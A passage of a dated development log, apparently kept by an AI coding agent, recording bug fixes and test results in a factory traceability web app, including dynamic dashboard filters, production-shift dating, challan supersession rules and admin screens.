  customer filter - a true facet); FQC Recent's defect list from `fqc_defect`.
- **Defects in the branch, fixed in the merge:** (1) the helper took any value
  starting "All"/"Both" for the no-filter option, so a customer named "Allied ..."
  could never stay picked - no filter is now position 0, and each select's own
  first option (`value=""` ones too) is kept as written; (2) FQC Recent's shift
  facet read `r.shift`, which `fqc_record` does not have - every shift option
  vanished; it is the decision's IST shift now (`_shiftOfStamp`); its defect facet
  read the dead legacy column; (3) Packing Log's status facet read the box's
  open/closed `state`, the server filters on the challan-derived `status`; customer
  showed codes; (4) Production Dashboard's line-table "View N" opened FQC
  inspections of the whole shift under a produced-on-this-line count - removed
  (the drill-in cannot narrow to a line); the customer table's button now shows the
  inspected count its list holds; (5) the branch added two `<th>` to v4 - reverted,
  the one column left is injected from icon_live.js.
- **New in the helper:** `opts.facet` (values computed without this dropdown's own
  filter are rebuilt even when narrowed; a pick missing from them stays listed),
  `opts.label`, numeric sort.
- **Tests:** `test_dashboard_cascade.js` 15/15 (its fake select now behaves like a
  real one; +5 cases for the defects above), `test_dashboards_e2e.py` 27/27 (runs on
  Playwright's own Chromium when the container path is absent; seeds a real defect
  code). Pre-existing, NOT from the merge (same on main before it): `test_packing.js`
  18 failing, `test_js.js` a syntax error, `test_fqc_dashboard.js` exits 1 silently.

## 6 Oct 2026 - Overnight to-do (Mukesh's list, then what I find on the way)

Kept up to date through the night; each item is ticked with its commit.

**Asked by Mukesh**
- [x] Merge `overnight-filter-work` into main - `bd70178`.
- [x] Dynamic filters on EVERY filter in the app, not only dashboards - done screen
      by screen through 6 Oct (Production Entry d285944, LOP e71d38a, FQC Dashboard
      42afeca, Production Dashboard + Management 5aa5810, Packing Log + Stock &
      Dispatch + Recent gradings 3595fda, table filters 995ca38, the three lists
      in the commit after). The FQC drill-in already was. Original wording: a dropdown
      offers only the values present under the other filters (the FQC drill-in's
      behaviour, with counts where the screen can afford them). Screens: FQC
      Dashboard, Management, Production Dashboard, Packing Log, Stock & Dispatch,
      FQC Recent, Recent Allocations, Challan list, Loading list, Gate pass list,
      Production Entry list, LOP list, and every searchable table card.
- [x] Production Entry list: show the production date and shift the entry is FOR
      ("for 11-09-2026 B, recorded 12-09-2026 01:12 (C)"), sort and filter by it -
      see the entry below.
- [x] LOP: the same - the date and shift a loss belongs to (a Retro event has no
      date field today, DECISIONS 11 / BACKLOG "LOP dating"), shown and counted -
      see the entry below.
- [x] Search & Trace: the production incharge(s) of a serial - see the entry below.
- [x] Admin: the dispatch user (`khedram.yadav`, created as Packing Operator with
      station Dispatch-01) has no permission option - the menu was clipped, see
      the entry below. (He is still a Packing Operator by role: if he is meant to
      be the Dispatch Operator, change the role or tick his screens.)
- [ ] **NEEDS MUKESH** - Admin: resetting / setting a person's TOTP never shows
      backup codes. Why: by Stage 1a's design only a Super Admin gets recovery
      codes (`icon_auth.enrol_commit`, rank == 3) and only a Super Admin may sign
      in with one (`_login_impl`, rank < 3 refused); every person whose TOTP is
      reset from the Users screen is an Admin, so the enrol page shows none. An
      Admin who loses the phone is recovered by a Super Admin (Reset TOTP, or a
      backup window). Proposed: codes for every authenticator account (Admin
      too), shown once on the enrol page, each usable once at sign-in and forcing
      a fresh enrolment, plus an in-app "set up your authenticator again" step
      after a recovery sign-in. NOT done overnight: it opens a new way into an
      Admin account, so it waits for your explicit yes (the session's safety
      check stopped it too).
- [x] Admin: parts that are still v4 dummies - see the entry below.
- [x] BACKLOG: open items; items logged fixed that have since regressed - see the
      entry below.

**Found on the way**
- [x] Loss & Breakdown: the in-process scrap table drew v4's five invented rows
      (and "Shift so far" counted their 31); the setup bar's Shift incharge was
      v4's demo list; Live's start time defaulted to v4's 14:05 - fixed with LOP.
- [x] `test_change_feed_ui.py`: 2 failing (Packing Log refetch across two
      browsers; the New Indent form left open) - the same on main before the
      merge (1be5874), so older than tonight. The first watched the wrong
      endpoint; the second is timing - it passed on re-run. 8/8.
- [x] `test_production.py` posted a fixed 2026-09-17, which the 30-day backdate
      limit refuses from 17 Oct - now yesterday's A shift.
- [x] Production Dashboard / Management counted production by when the entry
      was TYPED (`module_ev.prod_at` = `pe.created_at`): a C shift filed next
      morning was the next day's A shift - missed by the 26 Sep fix. Now the
      shift it ran. See the entry below.
- [x] Management Overview: its Wattage and Line filters are read and never
      sent - picking one changes nothing. Wattage now filters all three sources;
      Line is disabled with the reason (see below).
- [x] `wireMgmt()` is never called - dead code (its Reset is v4's mgReset,
      patched by wireDateResets); left alone, noted here.
- [x] Challan EDIT leaves a removed pallet stuck: the superseded original still
      "reserves" it - never offered again, refused on a new challan ("already on
      IS-..."), and Stock & Dispatch counts both versions. See the entry below.
- [x] Search & Trace "Built" read the production entry's TYPING time (a C shift
      filed next morning said "shift A") - now the production date and shift.
- [x] `test_dashboards_ist.py` asserted a loss's CALENDAR date, at whatever time
      the suite ran; `test_loss.py` / `test_stored_xss.py` used fixed start times.
- [x] Every screen reads "no filter" as a value starting "All"/"Both"
      (`renderMgmt` g() and others) - a customer named "Allied ..." is ignored.
      Every dynamic dropdown now reads through `_selVal()` (first option).
- [x] Production Dashboard's Customer / Model lists are the whole master, every
      serial ever, not what the period holds - facets (5aa5810).
- [x] FQC Recent: the client asks 1000 rows, the server caps at 100, so its
      dropdowns only know the newest 100 decisions - facets now read every live
      decision (the list itself still shows the newest 100).
- [x] `wireDynamicFilters` fills dashboard dropdowns from the whole master at
      sign-in, ahead of each screen's own dynamic list - it now leaves alone any
      dropdown its screen's facets have filled (it ran again on every rerender).
- [x] Dead code: the first `window.renderPackLog` (replaced by
      `renderLivePackLog` a few hundred lines later) - it was not quite dead:
      initUI() called it at every sign-in. Removed (entry below).
- [x] Stale tests on main: `test_packing.js` 18 failing (`packHold is not
      defined`), `test_js.js` a syntax error, `test_fqc_dashboard.js` exits 1
      without output. The two harnesses fixed (entry below); `test_js.js` left
      for Mukesh - BACKLOG (12 Sep review) already says it is v4's page script
      pasted in, not a test, and asks him to decide on deleting it.

## 6 Oct 2026 - Users: the last account's menu was cut off ("permission option is missing")

- **Reported:** the dispatch user Mukesh created (`khedram.yadav`) has no
  permission option.
- **Reproduced** (Chromium, scratch DB, the same four accounts): the account is the
  LAST card in the list. Its kebab menu is positioned inside the card list, and the
  card around the list clips what overflows it - only "Reset password" showed;
  "Edit permissions" and "Deactivate" were in the page but could not be seen or
  clicked. Every other account's menu was whole. Nothing about the account itself
  (role, station, creator) was involved.
- **Change:** the menu is laid over the page at its kebab (fixed position), opens
  upward when the window has no room below, follows the kebab when the page
  scrolls, and closes when the kebab scrolls out of sight.
- **Test:** `test_users_screen.py` +1 - at 1500x950 and 1280x720, every item of the
  last account's menu is the element at its own centre, and Edit permissions opens
  the editor for that account. `test_permission_editor.py` 6/6.

## 6 Oct 2026 - Production Entry list: by the production date and shift, recorded time beside it

- **Asked:** "Production entry shows date time when it was created in DB ... show for
  which production date shift it was entered like created at 12-09-2026 C shift for
  production 11-09-2026 B shift ... landing page filter should shows production date."
- **What was wrong:** the server already stored both (prod_date/shift = the shift it
  ran, from the form; created_at = when typed) and already filtered FROM/TO on
  prod_date - but the list's first column showed created_at and the list was ordered
  by it, so an entry filtered in as "the 11th" read "12-09-2026 07:05" and a late C
  shift report sat above the next day's A shift.
- **Change:** columns Production date | Shift | ... | Incharge (was "By" - it is the
  incharge) | Recorded ("12-09-2026 01:12:00 AM · C", greyed with a tooltip when it was
  typed after the shift it records). Ordered by production date, then shift (C, B,
  A), then typing time. FROM / TO are labelled "(production date)". The Shift and
  Customer dropdowns are dynamic: the server returns facets (`_facets`, new - each
  dimension read with every filter but its own), so a picked customer leaves every
  customer on offer while the shifts narrow to that customer's.
- **Tests:** `test_production.py` +1 (order, recorded day/shift of a C shift typed at
  01:12 and a B shift typed next morning, facets with a customer / a shift / a period
  picked) - 13/13. Seen in Chromium on a scratch DB.

## 6 Oct 2026 - LOP: a loss belongs to a production date and shift

- **Asked:** "... show for which production date shift it was entered ... This and LOP
  datetime." (the Production Entry request, for Loss of Production too).
- **What was wrong:** (1) a Live event stamped `event_date` with the CALENDAR date - a
  C shift stop at 01:00 on the 18th was dated the 18th while its shift said C (of the
  17th); the list hid this only because it filtered on `created_at`'s factory day;
  (2) a Retro event ("recorded after the fact") had no date, shift or end - it was
  filed under the moment it was typed and left OPEN, to be closed by a later click
  that stamped "now" as its end, so its minutes were the time until somebody
  clicked; (3) Live's start defaulted to v4's 14:05 - opened at 09:00 it ran 19 h;
  (4) the scrap table showed v4's invented rows and the incharge field v4's demo
  names.
- **Change:** Live - factory day + shift of the moment it is opened; start must be
  within 12 h (else Retro); start defaults to now. Retro - production date, shift,
  start and end on the form (shown only for Retro); the server checks the date as a
  production entry's (`_prod_when`), both times inside that shift (C: 22:00-06:00
  across midnight), the end not after the shift's end nor in the future; recorded
  closed, minutes from the two times. A Retro induced stop links to a primary of the
  same date + shift (its Caused-by list is fetched for that shift). `/api/loss_events`
  and the Production Dashboard count on `event_date` + `shift`; the list returns
  `created_at`, `recorded_shift`, `created_by` and a shift facet. On screen both
  event tables gain a Production column (date + shift, "Recorded ... (C) by ..." on
  hover); FROM / TO read "(production date)"; Shift is a facet; scrap says "Not built
  yet"; the incharge field says it is not recorded. Existing rows: `event_date`
  moved once to the factory day of `created_at` (what they already counted on).
- **Tests:** `test_loss.py` 17 (+7: factory day at 01:30, Live 12 h guard, Retro
  date/shift/minutes and its list, C across midnight, seven Retro refusals, Retro
  induced link, dashboard + facet; start times now follow the clock),
  `test_dashboards_ist.py` (pinned clock, factory day), `test_stored_xss.py`.
  Seen in Chromium: a Retro B shift event of yesterday typed in C shift lands on
  05-10-2026 B with 40 minutes; the open/closed tables show the Production column.

## 6 Oct 2026 - Search & Trace names the production incharge

- **Asked:** "in search and trace when serial number is searched show production
  incharge name also."
- **What was there:** the trace read the serial's production entry only for its
  `created_at` (the "Built" time), so the incharge, line and production date/shift
  never reached the page - and "Built" was the moment the entry was TYPED: a C shift
  filed at 07:00 next morning read "built ... shift A".
- **Change:** the journey gains a **Produced** step after Allocated - production date
  and shift, "Incharge: A, B" (the master's spellings, joined), the line, and when the
  entry was recorded; without an entry it says "no production entry yet" (and "counted
  as produced from its FQC scan" when it has one). Build instances gain a Shift
  incharge column; Built is the production date and shift of the entry (else the first
  FQC scan, labelled so). The event log gains "Production · Entry" ("for 05-10-2026
  shift C · A-Line · incharge Yaman, Rajkumar", by whoever typed it). A cancelled
  entry is not shown as the production.
- **Tests:** `test_production.py` +1 (Produced step, incharge, Built, the log row, a
  serial with no entry) - 14/14; `test_trace.js` 33/33; the trace readers
  (`test_fqc`, `test_repack`, `test_review`, `test_defect_readers`,
  `test_cancel_documents`, `test_custom_serials_ui`, `test_search_invoice`) pass.
  Seen in Chromium.

## 6 Oct 2026 - Dashboards count production on the shift it ran

- **What was wrong:** the 26 Sep fix made a production entry store the shift it RAN
  (prod_date + shift, the operator's statement) and the list filter on it - but both
  dashboards count from `_module_events`, whose `prod_at` was still the entry's
  `created_at`, the moment it was typed. A C shift report filed at 07:00 next morning
  was counted as the next day's A shift on the Production Dashboard (KPIs, Line &
  shift table) and Management Overview.
- **Change:** `prod_at` is the start of the shift the entry ran (`_PE_RAN`: prod_date
  + 06:00 / 14:00 / 22:00 - its factory day is prod_date, its shift the shift), or
  the first FQC scan when that came first or there is no entry; a cancelled entry
  names no production.
- **Tests:** `test_production.py` +1 (C of yesterday filed now counts on yesterday's
  C, not today, not A) - 15/15. `test_fqc_unplanned.py`'s line-merge test put its
  entry on 1 Sep A shift while expecting it in tonight's row - it passed only
  because production was dated by typing time; its entry now runs in the current
  shift (40/40). `test_dashboards_ist`, `test_customer_filters`, `test_loss`,
  `test_cancel_documents`, `test_dashrath_case`, `test_hash_route` pass.
- **Also in this commit - FQC Dashboard filters are facets:** `/api/fqc/dashboard`
  returns `facets` (shift, customer, model - each read with every other filter, its
  own left out; customer folded to the master's names) and the page rebuilds all
  three from them. `_selVal()` (new, shared) reads "no filter" as the first option,
  not as any value starting "All". Seen in Chromium: SG Meda picked - every customer
  still offered, models narrow to SG Meda's one. Three leftover `console.log` debug
  lines removed.

## 6 Oct 2026 - A pallet an edit took off a challan was stuck for good

- **Found** while making Stock & Dispatch's filters dynamic (not reported).
  **Reproduced** with the real routes: challan with pallet K001 -> Edit swaps it for
  K002 (-> MA) -> K001 was never offered to any other challan, a new challan with it
  was refused "ICON...0102 (in ISPL.../K001) is already on IS-06.10.2026/0001" (the
  SUPERSEDED original), Stock & Dispatch read 0 ready and two open challans, and the
  module journey still showed it dispatched on 0001.
- **Cause:** a superseded challan keeps its challan_serial rows (history, on
  purpose), and every "is it on a live challan" check excluded only `cancelled`:
  the challan pallet selector, `/api/boxes`' locked list, the invoice "already
  claimed" list, `db.serials_already_dispatched` / `serial_last_challan` (the
  refusal), `challans_against_irn`, and five queries in `db.stock_dispatch`. The
  Packing Log already excluded both. DECISIONS 1/3: a pallet returns to the
  selectors when it is off every live challan.
- **Change:** all of those read a challan as live only when it is not cancelled AND
  not superseded. Search & Trace's Challan step reads the live challan; on none it
  says "was on IS-... (superseded)". Also: "On open challan" summed each pallet's
  quantity once per module in it (2 pallets of 2 read 8) - counted per pallet now.
- **Test:** `test_challan.py` +1 (the swapped-out pallet is offered, accepted on a
  new challan, counted once, and its journey says where it was) - 69/69;
  `test_loading`, `test_packing`, `test_search_invoice`, `test_cancel_documents`,
  `test_repack` pass.

## 6 Oct 2026 - Production Dashboard and Management Overview: facets, and Wattage that works

- **Production Dashboard:** its Customer and Model lists were every customer / model
  ever in the serial master, whatever the period; Shift was built from two tables.
  `/api/prod/dashboard` now returns `facets` (`_module_facets`): the customers,
  models, wattages and shifts of modules that had anything happen in the period
  (allocated, produced, inspected, packed, dispatched), each read under every other
  filter and its own left out. The page reads its filters with `_selVal()`.
- **Management Overview:** Wattage and Line were read and NEVER SENT - picking 625W
  or A-Line changed nothing while looking applied. Wattage now goes to all three
  sources (`/api/prod/dashboard` and `/api/fqc/dashboard`: `s.wattage`;
  `/api/stock_dispatch`: pallets whose modules are of that wattage) and shows in
  "Filtered by". Line is disabled with "Not built yet - a line is recorded only on
  production entries" (DECISIONS 8, open: whether he wants it on production alone).
  Its four other dropdowns take the Production Dashboard's facets.
- **Tests:** `test_customer_filters.py` +1 (facets with nothing / a customer picked,
  wattage on all three sources) - 14/14. Seen in Chromium: 625W narrows customers
  and models and the produced KPI goes 30 -> 12; Line disabled; MSEDCL on the
  Production Dashboard keeps every customer and narrows the models.

## 6 Oct 2026 - Packing Log, Stock & Dispatch, Recent gradings: dynamic filters

- **Packing Log:** the query applies only the period; each dropdown is a predicate on
  the rows (a pallet's status is only known after the query), and `facets` gives each
  one's options under the OTHER filters. Status is the challan-derived progress the
  filter matches (open / packed / challaned / dispatched). The page reads its filters
  with `_selVal()`.
- **Stock & Dispatch:** `db.stock_dispatch` returns facets for customer, model and
  grade over the pallets the screen is about - ready to ship, on a draft challan, or
  dispatched in the period - each under the other filters.
- **Recent gradings (FQC Entry):** its dropdowns were read off the newest 100 rows on
  screen, so an older customer, wattage or defect could not be picked at all.
  `/api/fqc/recent` returns facets over every live decision (`_fqc_recent_facets`,
  the same predicates as `db.fqc_recent`); an empty defect facet falls back to the
  master list.
- **Tests:** `test_customer_filters.py` +3 (Packing Log, Stock & Dispatch, Recent
  gradings facets) - 17/17; `test_dashboards_e2e` 27/27, `test_fqc_screen` 15/15,
  `test_dashboards_ist`, `test_bad_input`, `test_dashrath_case`,
  `test_print_and_favicon` pass.

## 6 Oct 2026 - Table filters (icon_table.js) are facets; Recent Allocations' Indent filter matched nothing

- **Found:** Recent Allocations' Indent filter compared the whole cell ("AUG-05/2026 ·
  item 1") with the picked indent ("AUG-05/2026") - picking any indent emptied the
  table. Its values were also written into the page unescaped.
- **Change:** `icon_table.js`, the one table layer behind every searchable card:
  a cell's filter value is its `data-x` when it has one (the exact value Export
  already reads), else its text; every exact-match dropdown is rebuilt after each
  change from the values in the rows that pass the search and every OTHER filter
  (its first option kept, the pick never dropped); substring filters
  (`data-match="has"`) keep their fixed options, `data-facet="off"` opts out. Recent
  Allocations' indent cell carries `data-x`; its values are escaped. The Indent
  list's Item and Status filters are exact facets now (Status never offered "in
  progress" or "no items").
- **Tests:** `test_screens.js` 17/17, `test_indent_export`, `test_export_formulas`
  pass. Seen in Chromium: OCT-02/2026 picked shows its two items; on Indents, SG MEDA
  picked narrows Item to its one item and keeps both customers.

## 6 Oct 2026 - Challan, Loading Verification and Gate Pass lists: dynamic filters

- **Challan list:** its Status dropdown offered Draft / Issued / Cancelled - never
  **Superseded**, a status every edited challan's original has had since the edit
  rule went in, so those originals could not be picked out. `/api/challans` returns
  the statuses the search holds (its own filter left out); the dropdown follows.
- **Loading Verification list:** the loading states (pending / in progress / loaded)
  the dates and search hold.
- **Gate Pass list:** the Customer dropdown offered every party a gate pass ever went
  to; it is the parties of the dates and search now (case folded, the on-file
  spelling kept - rule 4 of test_customer_filters).
- **Tests:** `test_challan.py` +1 (Superseded offered, kept when Issued is picked,
  nothing for a search with no match) - 70/70; `test_loading` 15/15, the four
  `test_gatepass*.py`, `test_customer_filters` 17/17, and the JS harnesses
  (`test_gatepass`, `test_gatepass_landing`, `test_loading`, `test_challan`) pass.

## 7 Oct 2026 - Two JS test harnesses that had been failing silently

- **`test_fqc_dashboard.js` exited 1 with no output at all.** Its WSH shim declared
  `var console = {...}` inside an `if (typeof console === 'undefined')`. A `var` is
  hoisted to the whole file, so under node `console` WAS undefined, the branch ran,
  and every PASS / FAIL line went to the silent stub. Now set on the global object
  only under WSH. With its output back it showed 4 real failures: the stub's
  `<select>` was a bare value string (no options, no selectedIndex), which the
  shared "no filter = first option" reader cannot read - it is a real select now;
  a shift sent as a number was dropped (the reader takes 1/2/3 as well as A/B/C);
  and the FQC Dashboard block used `SHIFT_LETTER`, defined outside the block the
  test lifts - every render in the test died before the "Filtered by" note
  (inlined). **24/24.**
- **`test_packing.js` 18 failing.** `packHold` is v4's own global (`var cap=36,
  filled=0, grade='A', packHold=null, packed=[]`); the harness never declared it.
  Then 14 more: the harness declared v4's stand-ins (`packLookup`, `savePallet`,
  `pullSlot`, `setCap`, `resetPallet`) as functions - module-scoped under node -
  while `wirePacking()` replaces them on `window`, so every scan reached the stub.
  They are on the global object now, as in the browser. **26/26.** The app itself
  was never affected (v4 declares all of them globally).

## 7 Oct 2026 - The replaced Packing Log renderer ran at every sign-in

- **Found** chasing `test_change_feed_ui.py`'s "B's Packing Log never refetched
  itself": the test counted fetches to `/api/boxes`, but the Packing Log is drawn by
  `renderLivePackLog` from `/api/packing/log` - the live refresh worked all along
  (1.2 s once the test watched the right endpoint).
- **The real defect behind it:** the FIRST `window.renderPackLog` (from `/api/boxes`,
  every pallet ever, filtered in the browser) was replaced further down the file but
  still called once at every sign-in by `initUI()` through `window.packApply` - on
  whatever screen was open - and it rebuilt the Packing Log dropdowns from all of
  history before the real renderer ran. Removed, with the call; the screen's own
  hook draws it when visited.
- **Tests:** `test_change_feed_ui.py` 8/8 (watches `/api/packing/log`),
  `test_dashboards_e2e` 27/27, `test_screens.js` 17/17, `test_packing.js` 26/26,
  `test_fqc_dashboard.js` 24/24, `test_dashrath_case`, `test_print_and_favicon`.

## 7 Oct 2026 - Admin: the tabs that were v4 sample data now read the database

- **Asked:** "Admin screen remaining things which just for dummy".
- **What each tab showed (Chromium, scratch DB):** Audit trail and Document & print log
  - v4's invented rows (21-08-2026, Dasrath Pal, CHN-455...); Reason codes - codes
  nothing uses (CN-VEH, RP-SPLIT...) with invented "used this month" counts; Grade
  rules - Pmax bands proposing A/GY/BGY that FQC has never applied and that contradict
  DECISIONS 5; Access review - dashes and an empty table; Open questions - a fixed list
  from August, mostly answered, and a "Build order" saying FQC and Packing were held;
  Machines - counts edited in the page, lost on refresh. And nothing recorded a print
  at all (`box_print` exists, nothing writes it).
- **Change:**
  - Every document opened to print and every export is audited (`_log_print`): challan
    v1, challan v2 Excel, FTR, gate pass, packing list, serial barcodes (sheet and
    Excel), traceability report, the CSV exports - who, which document, which
    template. Copies are NOT claimed: the browser's print dialog chooses them.
  - `/api/admin/audit` (Admin / Super Admin): the audit table, newest first, 500 at a
    time, dates / user / entity / action / search, every dropdown a facet. Audit trail
    and Document & print log both read it (`kind=docs` = prints and exports).
  - Access review (`/api/admin/access-review`): accounts the Users screen manages with
    no sign-in for 60 days (or never), and every Admin; Deactivate goes through the
    real Users action; **Sign off review is real** - an `access.review` audit row
    (who, when, who was listed), which "Last review" shows.
  - Reason codes: what is really recorded this month - the LOP codes on downtime
    events, any code on an FQC decision, cancellations by document (each with a typed,
    mandatory reason - DECISIONS 1). "+ Add code" disabled: coded cancel reasons are
    not built.
  - Grade rules -> **FQC rules**: the rules as built (DECISIONS 5), the version in force
    (`FQC_RULE_VERSION`) and live decisions counted by the version that judged them.
    "+ New version" disabled with why.
  - Open questions: DECISIONS.md's `[open]` items and its decided-but-not-built ones,
    read from the file each time (so the two cannot disagree).
  - Machines: counts saved in `app_config` (`/api/machines` - Super Admin writes, 0-50
    per line, audited; everyone reads), applied at sign-in, so Loss & Breakdown and the
    Production Dashboard's modules-lost arithmetic use them. Non-Super-Admins see them
    read-only. "+ Add type" stays disabled.
- **Tests:** `test_admin_tabs.py` (new, 9: prints logged, audit facets, access review
  and sign-off, reason usage, FQC rule versions, open questions from the file, machine
  counts and their gate, operator refused, browser), `test_demo_claims.py` updated (Sign
  off review is real; + New version says why) 3/3, `test_anonymous_routes` 3/3,
  `test_screens.js`, `test_hash_route`, `test_users_screen`, `test_permission_editor`,
  `test_barcode_text_ui`, `test_gatepass_print`, `test_trace_export`, `test_box_number`,
  `test_role_gates`, `test_loss`, `test_dashboards_ist` pass.

## 7 Oct 2026 - BACKLOG sweep: open items, and whether the fixed ones still hold

- **Regressions:** the whole suite run (103 files, 4 at a time): 96 clean. Not
  regressions: `test_fqc_dashboard_ui.py`, `test_fqc_recent_ui.py` need a server on
  :5000 (the smoke scripts CLAUDE.md names); `test_pack_readiness.py` failed one
  browser case under the parallel load and passes alone (10/10, twice) - timing.
  `test_master_data_ui.py` pinned v4's page-only Reason-code edit buttons, which the
  Admin rewrite (8ac1054) replaced with real counts and a "+ Add code" that says why
  - updated to that (5/5). Skipped: the six server-on-a-port smoke scripts and
  `test_js.js` (not a test - see the 7 Oct harness entry).
- **Open items that were built and never ticked** (each checked in the code): Reset
  clears every filter field; Reassignment history; Recent & Grading filters; Print
  boxes; invoice screen wired to the real parser; the Traceability Report export;
  RGP/NRGP copy counts - ticked where they stand, with what was checked.
- **Still open, deliberately or waiting on Mukesh:** Production Entry segments
  (DECISIONS 10 - do not build unless asked); the Needs Review routes still designed
  only (NA queued, evidence mismatch on sync, DCR on indent vs material, invoice
  superseded under a new IRN as a review item, quality freeze on a material lot -
  awaiting spec); review/hold resolution rules (second signature); Stage 3's version
  checks (409) and cancel request/approve; Materials cannot be deleted (deliberate);
  the Quality downgrade of a pass (decided, its screen undecided); Box / Serial journey
  titles clickable - done in the next commit.

## 7 Oct 2026 - Journey titles link into Search; the drill-in names the production; the sign-in fill stops overwriting facets

- **Module journey:** the batch (BAT-...), pallet (ISPL...) and challan (IS-...) on
  the journey open in Search (`qlink`, as the box / challan / invoice views already
  did). Seen in Chromium: the challan step opens IS-07.10.2026/0001.
- **FQC drill-in:** the shift cell's tooltip said "Production entry recorded <when it
  was typed>"; `/api/fqc/dashboard/modules` now returns the entry's `prod_date` and
  `shift`, and the tooltip reads "Produced 05-10-2026 shift C (entry recorded ...)".
- **`wireDynamicFilters`** (sign-in, and every rerender) refilled the dashboards'
  Customer / Model / Shift dropdowns from the whole master, over the facets each
  screen had just set; `_dashCascade` marks a dropdown it has filled and the fill
  leaves it alone.
- **Tests:** `test_production.py` +1 (the drill-in rows carry the production date and
  shift) - 16/16; `test_trace.js` 33/33, `test_fqc_dashboard.js` 24/24,
  `test_dashboard_cascade.js` 15/15.

## 9 Oct 2026 - Overnight audit: indent to gate pass, every option, in a browser

Asked by Mukesh (8 Oct, night): audit everything from indent to gate pass in a real
browser - every option (create, draft, save, fetch, edit, cancel, discard, reset
filters, export, print) and every decision in DECISIONS.md - fix what needs no
approval, log everything, and list the doubts for the morning. Loss & Breakdown is
out of scope. The evidence, scripts and the full report are in
`D:\GITHub\ICON_TRACE_audit_20261009\` (outside the repo). Each fix below is its own
commit.

### Baseline: the whole suite, run at 00:05 IST
- 100 files (as on 7 Oct: the seven smoke scripts that need a fixed port, and
  `test_js.js`, skipped): 98 clean, 2 not.
- `test_dashboards_ist.py` 12/13 - a stale test, not a defect: it asserted the FQC
  drill-in rows carry no `prod_date` / `prod_shift`; a2a2031 (7 Oct) added both on
  purpose and ran `test_production.py`, not this file. It now asserts they are
  separate fields, blank when no production entry records the module, never
  borrowed from the inspection. 13/13.
- `test_dashboards_e2e.py` 26/27 - a real defect that shows only after midnight;
  see the next entry.

### FQC and Production Dashboards opened on the wrong day after midnight
- **Found:** `test_dashboards_e2e.py` failed when the suite ran at 00:05 (Production
  Dashboard: no View buttons). Seen in Chromium at 00:27 IST on 9 Oct: Management
  Overview, Packing Log and Stock & Dispatch opened on 08-10 (C shift of the 8th,
  right - DECISIONS 8); the **FQC Dashboard and the Production Dashboard opened on
  09-10**, a factory day nothing counts towards until 06:00. Both read empty for the
  second half of every C shift, while their own Reset went back to 08-10.
- **Cause:** `replaceDemoDates()` (every rerender, before the dashboards wire their
  dates) swaps v4's demo days for the CALENDAR date; `wireFqcDash()` /
  `wireProdDash()` then set the factory day only over a blank or a demo day, so the
  calendar date stayed. By day the two are the same date, which is why no daytime
  run saw it.
- **Change:** `replaceDemoDates()` uses the factory day for a field on a counting
  screen (FQC Dashboard, Production Dashboard, Management Overview, Packing Log,
  Stock & Dispatch) and the calendar date elsewhere (a challan's own date).
- **Test:** `test_factory_day_defaults_ui.py` (new, 3, the browser clock pinned to
  01:00 and 11:00 IST): every counting screen opens on the factory day and both
  dashboards ask the server for it; the challan date stays the calendar day. Fails
  before the change (FQC Dashboard on 09-10), passes after. `test_dashboards_e2e`
  27/27, `test_dashboards_ist` 13/13, `test_fqc_dashboard.js` 24/24,
  `test_dashboard_cascade.js` 15/15, `test_screens.js`, `test_trace.js`,
  `test_production.py`.


### Create Challan > draft > Create said "undefined serial(s) now dispatched"
- **Found** on the audit's golden path (agent A7, browser): submitting a saved draft
  toasted "IS-09.10.2026/0001 created - undefined serial(s) now dispatched".
- **Cause:** `/api/challan/<id>/submit` answered without `qty` (or `kw`, `suffix`),
  which `chHandleResult()` reads for Create and submit alike.
- **Change:** submit answers with the same shape Create does.
- **Test:** `test_challan.py` +1 (71 passed). From `audit/A7-golden-volume` 650210c.

### Search & Trace: the Quality Decision step showed FQC's time
- **Found** on the golden path (A7): a reject FQC'd at 05:52:47 and returned A by
  Quality at 05:54:26 showed 05:52:47 on its Quality Decision step - a module that
  waits days in the queue would be days wrong.
- **Cause:** `api_trace_serial` tagged the step with the FQC record's `at`, although
  `quality_grade()` stores `quality_at`.
- **Change:** the step carries `quality_at` (the record's time only for a row from
  before `quality_at` existed).
- **Test:** `test_fqc.py` journey test backdates the FQC decision and asserts the step
  carries `quality_at` (fails before; 54 passed after). From `audit/A7-golden-volume` e7615f1.

### A superseded challan could be "discarded" into cancelled
- **Found** by audit agent A4 (API on its server): `POST /api/challan/<id>/discard` on
  an edit's SUPERSEDED original answered 200 and rewrote it `cancelled` with the
  reason "draft discarded" - open to anyone with Challan write (DECISIONS 1 / 3:
  never silently rewritten).
- **Cause:** the route checked only `cancelled` and `issued`; every other status took
  the draft branch.
- **Change:** only a draft is discarded; anything else but issued is refused, naming
  its status.
- **Test:** `test_challan.py` +1. From `audit/A4-invoice-challan` 0166f21.

### A cancelled module gate pass left its challan looking locked
- **Found** independently by agents A4 and A5 (Chromium): after the module gate pass
  was cancelled (the way to release a challan, Round 34) the Challan list kept the
  lock and the detail panel said "locked" with no Edit / Cancel, while the server
  accepted both.
- **Cause:** `db.challans_list` / `db.challan_detail` counted cancelled gate passes;
  the server's lock (`gp_count_for_challan`) counts live ones.
- **Change:** both count live gate passes.
- **Test:** `test_challan.py` +1 (and A5's `test_gatepass.py` case, next commits).
  From `audit/A4-invoice-challan` d3fa85d.

### An invoice whose only challans are superseded or cancelled could never be cancelled
- **Found** by A4: edit a challan (MA), cancel MA - the invoice was refused cancel
  ("1 challan(s) reconcile against this invoice") because of the superseded original,
  while Create Challan already offered the same invoice as free.
- **Cause:** the cancel check counted every challan not `cancelled`.
- **Change:** only a live challan (draft / issued) locks it - the line the picker and
  `challans_against_irn` already draw. Not a looser rule: a superseded original is
  history, not a reconciliation (DECISIONS 1, "returns when that challan is cancelled").
- **Test:** `test_cancel_documents.py` +1 (a live draft still locks it).
  From `audit/A4-invoice-challan` 6357c43.

### Invoice upload: supersession and duplicates from the record; a typed e-Way Bill date read
- **Found** by A4 on the Tax Invoice screen (`/api/invoice/parse` + `/confirm`):
  1. `supersede_ids` came from the request and every id was superseded - any invoice
     could be marked superseded (and then refused at Create Challan) on the browser's
     word (DECISIONS 1);
  2. the live screen never sent it, and the server never worked it out, so an HO
     re-issue (same number, new IRN) left BOTH live - "a superseded invoice blocks"
     never happened on the live path (only the pre-v4 page did it);
  3. the same invoice uploaded twice hit UNIQUE(irn): a 500, the PDF already filed;
  4. an e-Way Bill date typed 08/10/2026 or 08-10-2026 was stored unread and skipped
     by both expiry checks - an expired one typed that way never blocked a challan.
- **Change:** `_invoice_on_file()` reads the record: a duplicate IRN is refused before
  the file is kept; the same number under another IRN is shown at parse and superseded
  at confirm (what the pre-v4 page did with a hidden field - "Saving this marks the
  earlier version superseded"); the browser's list is not read. `_read_ewb_date()`
